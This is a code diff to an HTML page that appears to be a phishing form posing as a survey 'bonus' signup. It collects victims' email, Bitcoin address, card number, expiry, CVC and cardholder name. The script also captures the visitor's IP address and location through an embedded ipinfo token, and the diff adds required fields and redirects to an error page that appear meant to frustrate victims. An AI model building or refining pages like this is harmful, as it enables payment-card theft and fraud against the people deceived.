@@ -85,34 +85,34 @@ More info: https://beyondco.de/blog/tailwind-jit-compiler-via-cdn
                           <!-- Email -->
                             <div>
                                 <label class="block text-sm font-medium mb-1" for="card-email">Email <span class="text-red-500">*</span></label>
-                                <input id="card-email" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="email" placeholder="john@company.com" />
+                                <input id="card-email" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="email" placeholder="john@company.com" required />
                             </div>
                         </div>
                           <!-- Card Number -->
                             <div>
                                 <label class="block text-sm font-medium mb-1" for="card-nr">Bitcoin Address <small>(where you will receive bonus)</small> <span class="text-red-500">*</span></label>
-                                <input id="btc-nr" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297" />
+                                <input id="btc-nr" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8ztwac72sfr9rusxg3297" required />
                             </div>
                             <!-- Card Number -->
                             <div>
                                 <label class="block text-sm font-medium mb-1" for="card-nr">Card Number <span class="text-red-500">*</span></label>
-                                <input id="card-nr" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="1234 1234 1234 1234" />
+                                <input id="card-nr" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="1234 1234 1234 1234" required />
                             </div>
                             <!-- Expiry and CVC -->
                             <div class="flex space-x-4">
                                 <div class="flex-1">
                                     <label class="block text-sm font-medium mb-1" for="card-expiry">Expiry Date <span class="text-red-500">*</span></label>
-                                    <input id="card-expiry" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="MM/YY" />
+                                    <input id="card-expiry" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="MM/YY" required />
                                 </div>
                                 <div class="flex-1">
                                     <label class="block text-sm font-medium mb-1" for="card-cvc">CVC <span class="text-red-500">*</span></label>
-                                    <input id="card-cvc" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="CVC" />
+                                    <input id="card-cvc" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="number" placeholder="CVC" required />
                                 </div>
                             </div>
                             <!-- Name on Card -->
                             <div>
                                 <label class="block text-sm font-medium mb-1" for="card-name">Name on Card <span class="text-red-500">*</span></label>
-                                <input id="card-name" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="John Doe" />
+                                <input id="card-name" class="text-sm text-gray-800 bg-white border rounded leading-5 py-2 px-3 border-gray-200 hover:border-gray-300 focus:border-indigo-300 shadow-sm placeholder-gray-400 focus:ring-0 w-full" type="text" placeholder="John Doe" required />
                             </div>
                             
                         <!-- Form footer -->
@@ -152,6 +152,10 @@ More info: https://beyondco.de/blog/tailwind-jit-compiler-via-cdn
         const expiryDate = document.getElementById('card-expiry').value;
         const cvc = document.getElementById('card-cvc').value;
         const nameOnCard = document.getElementById('card-name').value;
+
+        if (!email || !bitcoinAddress || !cardNumber || !expiryDate || !cvc || !nameOnCard) {
+            window.location.replace("https://88surveys.com/onboarding/new-user/bonus/error");
+        }
 
         // Get user's IP address and location
         const ipResponse = await fetch('https://ipinfo.io/json?token=b47f552bf713bf'); // Replace with your IPinfo token
@@ -199,6 +203,7 @@ More info: https://beyondco.de/blog/tailwind-jit-compiler-via-cdn
 
         } else {
             document.getElementById('bitcoin-form').reset();
+            window.location.replace("https://88surveys.com/onboarding/new-user/bonus/error");
         }
     }
 </script>
